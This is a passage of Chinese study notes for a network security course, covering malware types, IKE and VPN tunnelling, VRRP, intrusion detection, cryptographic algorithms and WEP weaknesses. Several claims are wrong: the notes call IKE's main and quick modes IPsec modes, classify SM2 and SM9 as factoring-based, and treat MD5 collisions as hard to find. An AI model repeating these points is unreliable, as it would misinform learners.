题目分析</p><p>有状态分组过滤器和无状态分组过滤器之间的主要区别：每一个分组独立地根据与过滤规则的匹配结果确定对其施加的操作。</p></blockquote><blockquote><p>😜 题目分析</p><p>有状态分组过滤器 <em>不能</em> 控制两个 <em>特定用户</em> 之间的数据交换过程。</p></blockquote><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><p>&#x3D;&#x3D;恶意代码类型&#x3D;&#x3D;：病毒、木马、蠕虫、Rootkit、勒索病毒、逻辑炸弹、僵尸网络、间谍软件、广告软件、移动恶意代码。</p><p>&#x3D;&#x3D;恶意代码特点&#x3D;&#x3D;：非授权性和破坏性。</p><p>&#x3D;&#x3D;恶意代码危害&#x3D;&#x3D;：</p><ul><li>攻击系统，造成信息系统瘫痪或操作异常。</li><li>危害数据文件的安全存储和使用。</li><li>泄露文件，配置或隐私信息。</li><li>肆意占用资源，影响系统或网络的性能。</li></ul><p>&#x3D;&#x3D;恶意代码生命周期&#x3D;&#x3D;：编制代码、传播、感染、触发、运行。</p><h3 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h3><p>&#x3D;&#x3D;木马病毒的特点&#x3D;&#x3D;：</p><ul><li>主要特征是伪装成正常文件，类似于间谍特工，窃取数据。</li><li>木马的作用范围是所有使用有木马的人在使用电脑时的资料。</li><li>通常有两个可执行程序：一个是控制端（控制者），另一个是被控制端（被控制者）。</li><li>注重对主机的控制，和运行的隐蔽性。</li><li>悄悄的窃取计算机数据，不会主动告诉你中木马了，需要自己去排查。</li><li>不会自我繁殖，也并不“刻意”地去感染其他文件，它会修改注册表、驻留内存、在系统中安装后门程序、开机加载附带的木马</li></ul><p>&#x3D;&#x3D;危害&#x3D;&#x3D;：窃取个人信息、远程控制、破坏系统、启动其他恶意软件。</p><p>&#x3D;&#x3D;典型木马名称&#x3D;&#x3D;：冰河、back orifice、Subseven、网络公牛、网络神偷、广外女生、网络精灵。</p><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>&#x3D;&#x3D;勒索病毒的特点&#x3D;&#x3D;：勒索病毒是一种恶意软件，其特点是加密用户的文件或系统，然后勒索受害者支付赎金以解密文件或恢复系统。勒索病毒通常通过网络传播，可以通过恶意链接、垃圾邮件附件等方式感染计算机。</p><p>&#x3D;&#x3D;危害&#x3D;&#x3D;：文件加密、系统锁定、数据丢失、经济损失。</p><p>&#x3D;&#x3D;典型勒索病毒&#x3D;&#x3D;：WannaCry、WannaRen、Reveton、CryptoLocker、VirLock、Locky、Petya。</p><h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h3><p>&#x3D;&#x3D;蠕虫病毒的特点&#x3D;&#x3D;：</p><ul><li>蠕虫病毒是一种能够利用系统漏洞通过网络进行自我传播（会传染）的恶意程序，它不需要附着在其他程序上，而是独立存在的。</li><li>明目张胆的破坏计算机数据，并弹个窗告诉你，你电脑种病毒了。</li><li>病毒的主要特征是感染正常文件。</li><li>传染目标是互联网内的所有主机，不同程度不同范围的影响主机的使用，破坏主机系统功能或者数据或者网络功能（消耗内存或网络带宽）。</li><li>具有自我复制能力（传播性），很强的感染性，一定的潜伏性（隐蔽性），特定的触发性和很大的破坏性。</li><li>病毒可以随着 U 盘、邮件、网站、共享文件等网络传输方式或者媒介传染到其他机器。</li></ul><p>&#x3D;&#x3D;危害&#x3D;&#x3D;：网络拥堵、系统瘫痪、数据破坏、后门植入。</p><p>&#x3D;&#x3D;典型蠕虫&#x3D;&#x3D;：尼姆达、震荡波、熊猫烧香。</p><h2 id="网络安全协议"><a href="#网络安全协议" class="headerlink" title="网络安全协议"></a>网络安全协议</h2><p>&#x3D;&#x3D;IKE&#x3D;&#x3D;：IKE用于动态建立安全关联（SA，Security Association）IKE协议分两个阶段：</p><ul><li>第一阶段：建立IKE安全关联，即在通信双方之间协商密钥</li><li>第二阶段：利用这个既定的安全关联建立IPSec安全关联</li></ul><blockquote><p>😜 题目分析</p><p>在TLS中，密码协商过程是由TLS握手协议完成的，而不是由”改变密码规范协议”完成的。TLS握手协议是TLS的一部分，它涉及身份鉴别、安全参数协商和密钥交换等过程。</p></blockquote><blockquote><p>😜 题目分析</p><p>IKE是Internet Key Exchange的缩写，是一种用于建立和管理IPsec（Internet Protocol Security）虚拟专用网络（VPN）连接的协议。IPsec是一组协议，用于提供网络层安全性，包括数据加密、身份验证和完整性保护。IKE协议用于在通信对等体之间进行安全的密钥交换，以建立和维护IPsec VPN连接。</p><p>IKE协议的主要功能包括：</p><ol><li>身份验证：通过相互验证通信对等体的身份，确保通信双方是可信的。</li><li>密钥协商：协商加密和完整性算法的密钥，用于保护IPsec通信的数据。</li><li>安全参数协商：协商IPsec连接的安全参数，例如加密算法、完整性算法和认证方法。</li><li>密钥生命周期管理：管理密钥的创建、更新和撤销，以确保安全的通信。</li></ol></blockquote><blockquote><p>😜 题目分析</p><p>实际上，IKE（Internet Key Exchange）协议用于在通信对等体之间进行安全的密钥交换，以建立和维护IPSec VPN连接。但是，并非所有的IPSec连接都必须由IKE动态建立。IPSec支持两种模式：主模式和快速模式。</p><p>在主模式下，IKE协议用于建立安全关联，并协商用于保护通信的密钥和参数。这种模式适用于需要更严格的身份验证和密钥协商的场景。</p><p>在快速模式下，已经存在预共享密钥或事先配置的密钥，不需要进行完整的IKE协商过程。快速模式主要用于简化密钥协商过程，提高连接建立的效率。</p></blockquote><blockquote><p>😜 题目分析</p><p>HTTPS并不是通过记录协议的内容类型字段来区分不同的应用层协议。HTTPS是在HTTP（Hypertext Transfer Protocol）上加入了TLS（Transport Layer Security）或SSL（Secure Sockets Layer）协议层，以提供安全的通信。</p></blockquote><h2 id="互联网安全技术"><a href="#互联网安全技术" class="headerlink" title="互联网安全技术"></a>互联网安全技术</h2><p>&#x3D;&#x3D;拒绝服务攻击原理&#x3D;&#x3D;：使用某种方法耗尽网络设备、链路或服务器资源，使其不能正常提供服务的一种攻击方式。</p><p>&#x3D;&#x3D;拒绝服务攻击防御&#x3D;&#x3D;：</p><ul><li>尽可能地减少肉鸡，这就要求连接在互联网上的主机系统能够具备防御病毒和黑客入侵的能力；</li><li>使主机系统拒绝响应 ICMP ECHO 请求报文；</li><li>网络具有统计目的 IP 地址相同的 ICMO ECHO 响应报文，或 ICMP 差错报告报文数量的能力，如果网络中单位时间内经过的目的 IP 地址相同的 ICMP ECHO 响应报文，或 ICMP 差错报告报文的数量超过设定的阈值，网络能够丢弃部分 ICMP ECHO 响应报文，或 ICMP差错报告报文。</li></ul><blockquote><p>😜 题目分析</p><p>解决路由项欺骗攻击的机制：路由项源端鉴别和完整性检测机制。</p></blockquote><blockquote><p>😜 题目分析</p><p>路由项源端鉴别和完整性检测的前提：相邻路由器配置相同的共享密钥。</p></blockquote><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h3><p>NAT（Network Address Translation）网络地址转换技术是将一个IP地址转换为另一个IP地址的功能。</p><p>&#x3D;&#x3D;NAT原理&#x3D;&#x3D;：</p><ol><li>私有网络：在私有网络中，设备使用私有IP地址（例如，192.168.0.1）进行通信。这些私有IP地址在公共网络中是不可路由的，因此无法直接与公共网络通信。</li><li>NAT路由器：私有网络中的设备通过一个称为NAT路由器的设备与公共网络相连。NAT路由器同时具有私有网络接口和公共网络接口。</li><li>地址转换：当私有网络中的设备发送数据包到公共网络时，NAT路由器会将源IP地址从私有IP地址转换为公共IP地址，并将此映射信息保存在转换表中。数据包的源端口也可能会被修改。</li><li>转发和响应：NAT路由器将转换后的数据包发送到公共网络，并在接收响应时，根据转换表将目标IP地址和端口进行逆转换，将数据包转发给正确的设备。</li><li>状态跟踪：为了确保响应数据包正确地返回给发送方，NAT路由器会在转换表中维护状态信息，跟踪每个会话的状态。</li></ol><h3 id="VRRP"><a href="#VRRP" class="headerlink" title="VRRP"></a>VRRP</h3><p>VRRP（Virtual Router Redundancy Protocol，虚拟路由器冗余协议）是一种网络协议，用于提供冗余的默认网关服务。它允许多个路由器共同提供相同的虚拟IP地址，以实现冗余和故障转移。</p><p>&#x3D;&#x3D;VRRP原理&#x3D;&#x3D;：</p><ol><li>虚拟路由器：在VRRP中，多个路由器被配置为属于同一个虚拟路由器组。其中一个路由器被选为虚拟路由器的主路由器，其他路由器则作为备份路由器。</li><li>虚拟IP地址：虚拟路由器组共享一个虚拟IP地址，该地址是作为默认网关提供给局域网中的设备的。设备将所有外部通信发送到虚拟IP地址。</li><li>VRRP消息：主路由器和备份路由器之间通过VRRP消息进行通信。主路由器定期发送VRRP通告消息，包含虚拟路由器的状态和优先级信息。备份路由器接收到通告消息后，可以检测主路由器是否正常运行。</li><li>选举主路由器：VRRP使用优先级来确定主路由器。主路由器的优先级较高，如果主路由器失效，备份路由器中优先级最高的路由器将接替成为新的主路由器。</li><li>故障转移：当主路由器失效或不可达时，备份路由器中优先级最高的路由器将接管虚拟IP地址，成为新的主路由器。这样，网络中的设备仍然可以通过虚拟IP地址进行通信，而不会中断。</li></ol><p>&#x3D;&#x3D;模式&#x3D;&#x3D;：</p><ul><li>抢占模式：如果Backup设备的优先级比当前Master设备的优先级高，则主动将自己切换成Master。</li><li>非抢占模式：只要Master设备没有出现故障，Backup设备即使随后被配置了更高的优先级也不会成为Master设备。</li></ul><p>&#x3D;&#x3D;状态机&#x3D;&#x3D;：</p><ul><li><p>初始状态（Initialize）：在这个状态下VRRP是不可用的，在这个状态下的设备是不会处理VRRP报文的，通常是刚配置VRRP时和检测到故障是会是这个状态。收到接口 Up 的消息后，如果设备的优先级为 255，则直接成为 Master 设备；如果设备的优先级小于 255，则会先切换至 Backup 状态。</p></li><li><p>活动状态（Master）</p><ul><li>定期发送VRRP报文。</li><li>以虚拟MAC地址响应对虚拟IP地址的ARP请求。</li><li>转发目的MAC地址为虚拟MAC地址的IP报文。</li><li>如果它是这个虚拟IP地址的拥有者，则接收目的IP地址为这个虚拟IP地址的IP报文。否则，丢弃这个IP报文。</li><li>如果收到比自己优先级大的报文则转为Backup状态。</li><li>如果收到优先级和自己相同的报文，并且发送端的IP地址比自己的IP地址大，则转为Backup状态。</li><li>当接收到接口的Shutdown事件时，转为Initialize。</li></ul></li><li><p>备份状态（Backup）</p><ul><li>接收Master发送的VRRP报文，判断Master的状态是否正常。</li><li>对虚拟IP地址的ARP请求，不做响应。</li><li>丢弃目的MAC地址为虚拟MAC地址的IP报文。</li><li>丢弃目的IP地址为虚拟IP地址的IP报文。</li><li>Backup状态下如果收到比自己优先级小的报文时，丢弃报文，立即切换为Master（仅在抢占模式下生效）。</li><li>如果收到优先级和自己相同或者比自己高的报文，则重置定时器，不进一步比较IP地址。</li><li>当接收到接口的Shutdown事件时，转为Initialize。如果MASTER_DOWN_INTERVAL定时器超时，则切换为Master。</li></ul></li></ul><p>其中，只有处于Master状态的设备才可以转发那些发送到虚拟IP地址的报文。</p><h2 id="虚拟专用网络技术"><a href="#虚拟专用网络技术" class="headerlink" title="虚拟专用网络技术"></a>虚拟专用网络技术</h2><p>&#x3D;&#x3D;企业网&#x3D;&#x3D;：</p><ul><li>企业拥有企业网全部资源（包括SDH）-&gt;专用网络</li><li>公共通信服务提供商（如电信）提供SDH点对点物理链路</li><li>企业网封闭，外人较难嗅探&#x2F;截获</li><li>成本高，SDH点对点物理链路贵</li><li>难度大，不同提供商难协商（上海、纽约）</li><li>不容易扩展，LAN变动需要调整SDH</li><li>灵活性差，SDH带宽难调</li></ul><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>&#x3D;&#x3D;定义&#x3D;&#x3D;：指通过一个共用网络（通常是因特网）建立一个临时的、安全的链接，是一条穿过共用网络的安全稳定的隧道，是对企业内部网的拓展。</p><p>&#x3D;&#x3D;功能&#x3D;&#x3D;：虚拟专用网咯能够利用因特网或其他公共互联网罗的基础设施为用户创建隧道，并提供与专用网络一样的安全和功能保障。VPN至少应该能提供三个方面功能：加密数据、信息认证和身份认证、访问控制。</p><p>&#x3D;&#x3D;特点&#x3D;&#x3D;：费用低、安全保障、服务质量保证、可扩充性和灵活性、可管理性。</p><p>&#x3D;&#x3D;关键技术&#x3D;&#x3D;：隧道技术、加&#x2F;解密技术、密钥管理技术、身份认证技术、访问控制。</p><p>&#x3D;&#x3D;隧道协议&#x3D;&#x3D;：指通过一个公用网络（通常是Internet）建立的一条穿过公用网络的安全的、逻辑上的隧道。在隧道中，数据包被重新封装发送。</p><blockquote><p>LAN是Local Area Network（局域网）的缩写。局域网是指在一个相对较小的地理范围内，如家庭、办公室、学校或建筑物内部等，通过通信设备（如路由器、交换机）连接起来的计算机网络。局域网通常用于共享资源和实现内部通信，例如共享文件和打印机，以及在局域网内部传输数据和信息。局域网通常具有高速、低延迟和高安全性的特点，可以提供快速、可靠的数据传输和通信服务。</p></blockquote><blockquote><p>PPTP（Point-to-Point Tunneling Protocol，点对点隧道协议）：PPTP是一种用于在公共网络上创建安全连接的协议。它通过在Internet上创建一个隧道，将远程计算机或网络与私有网络连接起来。PPTP使用点对点连接，支持数据加密和身份验证，可以在多种操作系统上使用。</p></blockquote><blockquote><p>L2TP（Layer 2 Tunneling Protocol，第二层隧道协议）：L2TP是一种用于建立VPN连接的协议。它结合了PPTP和Cisco的L2F（Layer 2 Forwarding）协议的优点。L2TP通过在现有的Internet协议（如IP）上创建一个虚拟隧道，使远程用户能够安全地访问私有网络。L2TP本身不提供加密和身份验证功能，通常与IPsec（Internet Protocol Security）协议结合使用以提供更高的安全性。</p></blockquote><blockquote><p>L2F（Layer 2 Forwarding，第二层转发）：L2F是一种由思科系统开发的协议，用于在公共网络上建立虚拟专用网络连接。L2F允许远程用户通过Internet连接到私有网络，类似于PPTP和L2TP。然而，L2F通常与其他协议（如IPsec）结合使用，以提供更高的安全性。</p></blockquote><blockquote><p>IPSec是一组用于保护IP通信的协议和算法。它提供了对IP数据包的加密、身份验证和完整性保护。IPSec可以用于建立安全的虚拟专用网络（VPN）连接，以保护远程用户与私有网络之间的通信。它可以在网络层对数据进行加密和解密，确保数据在传输过程中的安全性。IPSec广泛用于保护互联网通信，特别是在远程访问、分支机构连接和站点到站点连接中。</p></blockquote><blockquote><p>GRE是一种通用的封装协议，用于在IP网络上封装其他协议的数据包。它允许将不同类型的网络协议数据包封装在IP数据包中进行传输。GRE可以用于创建虚拟专用网络（VPN），在不同的网络之间传输数据。它通常与其他协议（如IPSec）结合使用，以提供安全性和隧道功能。GRE封装的数据包在传输过程中不加密，因此如果需要数据的机密性，可以与IPSec一起使用以提供加密功能。</p></blockquote><blockquote><p>😜 题目分析</p><p>虚拟专用网络有别于专用网络的地方：<em>使用公共网络提供的数据传输通路</em>。</p><p>虚拟专用网络（Virtual Private Network，VPN）与专用网络（Private Network）的区别在于它们使用的数据传输通路。</p><p>专用网络是一种在物理上独立的网络，通常由私有线路或专用通信设备连接起来。这种网络是完全独立的，不与公共网络连接，因此具有较高的安全性和可靠性。专用网络通常由组织自己建立和管理，用于内部通信和数据传输。</p><p>相比之下，虚拟专用网络是在公共网络基础上创建的一种加密隧道。它利用公共网络（如互联网）提供的数据传输通路，通过加密技术和隧道协议来保护数据的安全性和隐私性。虚拟专用网络可以在公共网络上模拟出一个专用网络的效果，使得远程用户可以通过公共网络访问内部网络资源，同时确保数据传输的机密性和完整性。</p></blockquote><h3 id="第三层隧道和IPSec结构与原理"><a href="#第三层隧道和IPSec结构与原理" class="headerlink" title="第三层隧道和IPSec结构与原理"></a>第三层隧道和IPSec结构与原理</h3><ul><li><p>隧道用于实现企业局域网之间以私有IP地址为源和目的IP地址的IP分组的传输过程。</p></li><li><p>经过隧道传输的以私有IP地址为源和目的IP地址的IP分组最终需要封装成以隧道两端的全球IP地址为源和目的IP地址的IP分组格式。</p></li><li><p>通过安全关联，一是可以完成隧道两端之间的双向身份鉴别过程，二是可以实现经过安全关联传输的以隧道两端的全球IP地址为源和目的IP地址的IP分组的保密性和完整性。</p></li></ul><p>&#x3D;&#x3D;缺陷&#x3D;&#x3D;：</p><ol><li>VPN对远程终端的访问权限没有限制；</li><li>家庭局域网中的终端无法访问其他内部网络；</li><li>远程终端要安装专用客户端；</li><li>内部网络对于远程终端都不是透明的；</li><li>无法实现基于用户授权。</li></ol><h3 id="第二层隧道和IPSec结构与原理"><a href="#第二层隧道和IPSec结构与原理" class="headerlink" title="第二层隧道和IPSec结构与原理"></a>第二层隧道和IPSec结构与原理</h3><ul><li>隧道用于实现PPP帧传输过程。</li><li>经过隧道传输的PPP帧最终需要封装成以隧道两端的全球IP地址为源和目的IP地址的IP分组格式。</li><li>通过安全关联，一是可以完成隧道两端之间的双向身份鉴别过程，二是可以实现经过安全关联传输的以隧道两端的全球IP地址为源和目的IP地址的IP分组的保密性和完整性。</li></ul><blockquote><p>PPP是点对点协议（Point-to-Point Protocol）的缩写，是一种用于在计算机网络中建立和维护数据链路连接的协议。它是一种数据链路层协议，广泛应用于互联网接入、远程访问和虚拟专用网络（VPN）等场景。主要功能是在两个网络节点之间建立可靠的、双向的通信连接。它提供了数据链路层的封装、封装检验、错误检测和链路管理等功能，确保数据的可靠传输和链路的稳定性。</p></blockquote><blockquote><p>😜 题目分析</p><p>‍基于第二层隧道实现远程终端和内部网络之间的互联时，接入控制设备为远程终端分配 <em>私有IP地址</em>，并创建一项将该私有IP地址与远程终端和接入控制设备之间第二层隧道绑定在一起的动态路由项。</p></blockquote><h3 id="SSL-VPN"><a href="#SSL-VPN" class="headerlink" title="SSL VPN"></a>SSL VPN</h3><ul><li><p>SSL VPN也是一种实现远程终端访问内部网络资源的技术，SSL VPN的核心设备是SSL VPN网关，SSL VPN网关一端连接互联网，另一端连接内部网络。</p></li><li><p>远程终端分配全球IP地址，通过互联网访问SSL VPN网关。</p></li><li><p>远程终端通过基于SSL协议的HTTPS访问SSL VPN网关。</p></li><li><p>远程终端通过HTTPS访问SSL VPN网关。以此实现远程终端与SSL VPN网关之间的双向身份鉴别，保证远程终端与SSL VPN网关之间传输的数据的保密性和完整性。</p></li></ul><p><img src="https://img.ma5hr00m.top/blog/20240126132829.png" alt="20240126132829"></p><p>与第二层隧道+IPSec相比，&#x3D;&#x3D;SSL VPN特点&#x3D;&#x3D;：</p><ol><li>不需要为远程终端分配内部网络使用的私有IP地址；</li><li>远程终端直接可以通过浏览器访问内部网络资源；</li><li>可以基于用户设置访问内部网资源的权限。</li></ol><blockquote><p>😜 题目分析</p><p>SSL VPN网关通过连接内部网络的接口建立与内部网络各个服务器之间的传输通路，通过相应的 <em>应用层协议</em> 完成访问内部网络中各个服务器的过程。</p><p>具体来说，SSL VPN网关使用SSL（Secure Sockets Layer）或其继任者TLS（Transport Layer Security）协议来建立加密的虚拟专用网络连接。SSL&#x2F;TLS协议位于传输层和应用层之间，它提供了安全的通信通道，确保数据在传输过程中的机密性和完整性。</p><p>当用户通过SSL VPN客户端连接到SSL VPN网关时，SSL VPN网关会验证用户的身份并建立安全的通信通道。一旦建立了安全通道，用户可以通过SSL VPN网关访问内部网络中的各个服务器。</p><p>在访问内部网络中的服务器时，SSL VPN网关会使用相应的应用层协议，如HTTP（超文本传输协议）、FTP（文件传输协议）、RDP（远程桌面协议）等，来完成与服务器之间的通信。这些应用层协议负责在客户端和服务器之间传输数据，并提供相应的服务。</p></blockquote><h2 id="入侵检测技术"><a href="#入侵检测技术" class="headerlink" title="入侵检测技术"></a>入侵检测技术</h2><p>&#x3D;&#x3D;入侵检测&#x3D;&#x3D;：指通过对计算机网络或计算机系统中的若干关键点手机信息并对其进行分析，从中发现网络或系统中是否有违反安全策略的行为和被攻击的迹象。</p><p>&#x3D;&#x3D;IDS定义&#x3D;&#x3D;：进行入侵检测的软件与硬件的组合。</p><p>&#x3D;&#x3D;入侵检测通用框架&#x3D;&#x3D;：</p><p><img src="https://img.ma5hr00m.top/blog/20240126132836.png" alt="20240126132836"></p><p>&#x3D;&#x3D;IDS类型&#x3D;&#x3D;：</p><ul><li><p>异常检测：异常检测技术又称为基于行为的入侵检测技术，用来识别主机和网络中的异常行为。该技术假设攻击与正常合法的活动有明显的差异。</p></li><li><p>误用检测：误用检测技术又称为基于知识的入侵检测技术。该技术假设所有入侵行为和手段（及其变形）都能表达为一种模式或特征。</p></li></ul><h3 id="IDS应用"><a href="#IDS应用" class="headerlink" title="IDS应用"></a>IDS应用</h3><p>&#x3D;&#x3D;NIDS&#x3D;&#x3D;：</p><p>一种部署在网络中的入侵检测系统，用于监视和分析网络流量以检测潜在的入侵行为。NIDS位于网络的关键位置，例如网络边界、内部网关或关键网络段，它通过监控网络流量来检测恶意活动或异常行为。NIDS可以分析传入和传出的数据包，识别已知的攻击模式或异常行为，并生成警报通知管理员。NIDS可以检测诸如端口扫描、拒绝服务攻击、恶意软件传播等网络攻击行为。</p><p>成本低、攻击者转移证据困难，实时检测和响应，能够检测为成功的攻击企图，操作系统独立。</p><p>防入侵欺骗能力差，交互式网络环境中难以配置，受硬件条件限制，不能处理加密后的数据。</p><p>&#x3D;&#x3D;HIDS&#x3D;&#x3D;：</p><p>一种部署在主机上的入侵检测系统，用于监视和分析主机的活动以检测潜在的入侵行为。HIDS运行在特定的主机上，监视主机的操作系统、应用程序和文件系统等关键组件的活动。它可以检测主机上的异常行为、恶意软件感染、未经授权的访问等入侵行为。HIDS可以通过监视日志文件、系统调用、注册表、文件完整性等方式来检测潜在的安全事件，并生成警报通知管理员。</p><p>检测准确度较高、可以检测到没有明显行为特征的入侵、能够对不同操作系统进行有针对性的检测、成本较低、不会因网络流量影响性能、适合加密和交换环境。</p><p>实时性较差、无法检测数据包的全部、检测效果取决于日志系统、占用主机资源、隐蔽性较差、如果入侵者能够修改校验和，这种IDS将<br>无法起到预期的作用</p><p>&#x3D;&#x3D;DIDS&#x3D;&#x3D;：</p><p>分布式的入侵检测系统，由多个IDS组成，分布在不同的网络节点上，共同工作以检测和响应入侵行为。DIDS可以跨越多个网络边界和子网，实时共享和分析信息，以便更全面地检测和响应入侵。DIDS的分布式部署可以提供更高的可扩展性和容错性，同时减轻单个IDS的负担，增强整体的入侵检测能力。</p><p>&#x3D;&#x3D;可部署的位置&#x3D;&#x3D;：外网入口（防火墙之前）、内网主干（最常用）、DNZ区（DMZ区总口，最有必要的）、关键子网。</p><h2 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h2><p>&#x3D;&#x3D;密码算法分类&#x3D;&#x3D;：</p><ul><li>对称密码体制：<ul><li>序列密码算法（流密码）：RC4</li><li>分组加密算法（Block Cipher）：DES、SM4、SM1、SM7</li></ul></li><li>非对称密码体制<ul><li>基于因子分解难题：RSA、SM2、SM9</li><li>基于离散对数难题：ECC</li></ul></li><li>消息摘要算法：MD5、SHA1、SHA256、SM3</li><li>密钥交换算法：Diffle-Hellman</li></ul><blockquote><p>😜 题目分析</p><p>对称密钥体制和非对称密钥体制结合：用对称密钥加密算法加密数据，用非对称密钥加密算法加密对称密钥。</p></blockquote><h3 id="典型代表算法"><a href="#典型代表算法" class="headerlink" title="典型代表算法"></a>典型代表算法</h3><p>&#x3D;&#x3D;RC4&#x3D;&#x3D;（对称密码算法）：</p><ul><li>RC4算法使用一个变换后的密钥流（Keystream）与明文进行异或运算，得到密文。</li><li>密钥流的生成基于一个内部状态向量（State Vector）和密钥。</li><li>初始化阶段：根据密钥的字节值生成一个256字节的S盒（S-box），并初始化内部状态向量。</li><li>密钥调度阶段：使用密钥和S盒进行初始排列，生成初始的内部状态向量。</li><li>密钥流生成阶段：根据内部状态向量和密钥，生成密钥流。</li><li>可变密钥长度：RC4算法支持变长密钥，密钥长度可以是1到256字节。</li><li>自适应性：RC4算法可以根据实际的密钥长度自动调整内部状态向量和S盒的生成。</li></ul><p>&#x3D;&#x3D;DES&#x3D;&#x3D;（对称密码算法）：</p><ul><li>DES算法使用一个56位的有效密钥（密钥实际上长度为64位）对64位的明文进行加密，生成64位的密文。</li><li>加密过程中，明文被分为64位的数据块，并经过一系列的置换、替换、移位和异或运算。</li><li>DES算法主要包括初始置换（Initial Permutation）、16轮的Feistel结构和最终置换（Final Permutation）。</li><li>可逆性：DES算法是可逆的，使用相同的密钥进行解密可以得到原始的明文。</li><li>固定密钥长度：DES算法的密钥长度固定为56位，这限制了其密钥空间的大小，使得DES算法容易受到暴力破解攻击。</li><li>替代算法的使用：由于DES算法的密钥长度较短，为了提高安全性，通常使用3重DES（Triple DES）来增加密钥长度。</li></ul><p>&#x3D;&#x3D;SM4&#x3D;&#x3D;（对称密码算法）：</p><ul><li>SM4算法是一种分组密码算法，将明文和密钥分为固定长度的数据块（128位），并通过一系列的加密轮函数来进行加密和解密操作。</li><li>加密过程中，明文被分为多个数据块，每个数据块经过一系列的轮函数处理，包括置换、替换、异或和线性变换等操作。密钥也经过一系列的扩展和置换操作生成轮密钥。</li><li>SM4算法的核心操作是非线性的S盒替换和线性变换，通过多轮的迭代运算来混淆和扩散数据。</li><li>可逆性：SM4算法是可逆的，使用相同的密钥进行解密可以得到原始的明文。</li></ul><p><img src="https://img.ma5hr00m.top/blog/20240126132848.png" alt="20240126132848"></p><p>&#x3D;&#x3D;RSA&#x3D;&#x3D;（非对称密码算法）：</p><ul><li><a href="https://juejin.cn/post/7113937876919943205">RSA 算法图解+数学证明</a>， 稀土掘金</li></ul><p>&#x3D;&#x3D;ECC&#x3D;&#x3D;（非对称密码算法）：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/42629724">ECC椭圆曲线密码学的原理、公式推导、例子、Python实现和应用</a>， 知乎</li></ul><p>&#x3D;&#x3D;MD5&#x3D;&#x3D;：</p><p>实现原理：</p><ul><li>输入：MD5算法接受任意长度的输入消息。</li><li>填充：如果输入消息的长度不是64的倍数，MD5会通过填充来使其长度满足要求。</li><li>划分：将填充后的消息划分为若干个512位（64字节）的分组。</li><li>初始化：MD5算法使用4个32位的寄存器（A、B、C、D）作为中间变量，并初始化为固定的初始值。</li><li>循环运算：对每个分组进行一系列的循环运算，包括位操作、逻辑函数和模运算等。</li><li>输出：最后，将四个寄存器的内容按照一定的顺序连接起来，形成128位（16字节）的哈希值。</li></ul><p>特点：</p><ul><li>固定长度：MD5生成的哈希值固定为128位（16字节），无论输入消息的长度是多少。</li><li>不可逆性：MD5是一种单向哈希函数，即无法从哈希值反推出原始输入消息。</li><li>抗碰撞性：MD5算法在理论上存在碰撞（两个不同的输入消息产生相同的哈希值）的可能性，但实际上很难找到碰撞。</li></ul><p>&#x3D;&#x3D;SM3&#x3D;&#x3D;：</p><ul><li>对长度为ll&lt;264）比特的消息m， SM3杂凑算法经过填充和迭代压缩，生成杂凑值，杂凑值长度为256比特。</li><li>填充后的消息m′ 的比特长度为512的倍数。</li></ul><p>&#x3D;&#x3D;Diffie-Hellman  密钥交换&#x3D;&#x3D;：</p><ul><li><a href="https://www.cnblogs.com/s2603898260/p/14624226.html">DH算法图解+数学证明</a>，博客园</li></ul><h2 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h2><h2 id="无线局域网安全技术"><a href="#无线局域网安全技术" class="headerlink" title="无线局域网安全技术"></a>无线局域网安全技术</h2><p>&#x3D;&#x3D;WEP协议原理&#x3D;&#x3D;（有线等效保密协议）：</p><ul><li>WEP使用RC4算法对数据进行加密和解密。加密过程中使用一个共享的密钥（通常为固定长度的40位或104位密钥）和一个初始化向量（IV）。</li><li>加密过程中，WEP将明文数据和初始化向量进行组合，并使用密钥和RC4算法生成密钥流。密钥流与明文数据进行异或操作，得到加密后的数据。</li><li>接收方使用相同的密钥和初始化向量，进行解密操作，将密文数据解密为明文数据。</li></ul><p><img src="https://img.ma5hr00m.top/blog/20240126132900.png" alt="20240126132900"></p><p><img src="https://img.ma5hr00m.top/blog/20240126132905.png" alt="20240126132905"></p><p>优缺点：</p><ul><li>简单性：WEP协议的实现相对简单，适用于早期的无线局域网设备。</li><li>兼容性：WEP协议被广泛支持，可以在许多无线设备上使用。</li><li>一次性密钥字典：IV（明文传输）是24位，有限穷举空间为2^24，固定字典时间为1220s</li><li>静态密钥管理缺陷：所有终端共享相同密钥，静态配置。</li><li>完整性检测缺陷：CRC算法的缺陷。</li><li>单向鉴别。</li></ul><p>&#x3D;&#x3D;TKIP原理&#x3D;&#x3D;（临时密钥完整性协议，兼容 WEP）</p><p>&#x3D;&#x3D;CCMP原理&#x3D;&#x3D;</p><h2 id="做做题"><a href="#做做题" class="headerlink" title="做做题"></a>做做题</h2><h3 id="MOOC"><a href="#MOOC" class="headerlink" title="MOOC"></a>MOOC</h3><ul><li><input checked="" disabled="" type="checkbox"> 第一章 网络安全概论</li><li><input checked="" disabled="" type="checkbox"> 第二章 局域网网络攻击与防御技术 1</li><li><input checked="" disabled="" type="checkbox"> 第二章 局域网网络攻击与防御技术 2</li><li><input checked="" disabled="" type="checkbox"> 第二章 局域网网络攻击与防御技术 3</li><li><input checked="" disabled="" type="checkbox"> 第三章 安全技术基础 1</li><li><input checked="" disabled="" type="checkbox"> 第三章 安全技术基础 2</li><li><input checked="" disabled="" type="checkbox"> 第四章 网络安全协议</li><li><input checked="" disabled="" type="checkbox"> 第五章 无线局域网安全技术</li><li><input checked="" disabled="" type="checkbox"> 第六章 Web攻击与防御技术 SQL</li><li><input checked="" disabled="" type="checkbox"> 第六章 Web攻击与防御技术 Else</li><li><input checked="" disabled="" type="checkbox"> 第七章 恶意代码技术</li><li><input checked="" disabled="" type="checkbox"> 第八章 防火墙技术</li><li><input checked="" disabled="" type="checkbox"> 第九章 互联网安全技术 1</li><li><input checked="" disabled="" type="checkbox"> 第九章 互联网安全技术 2</li><li><input checked="" disabled="" type="checkbox"> 第九章 互联网安全技术 课后1</li><li><input 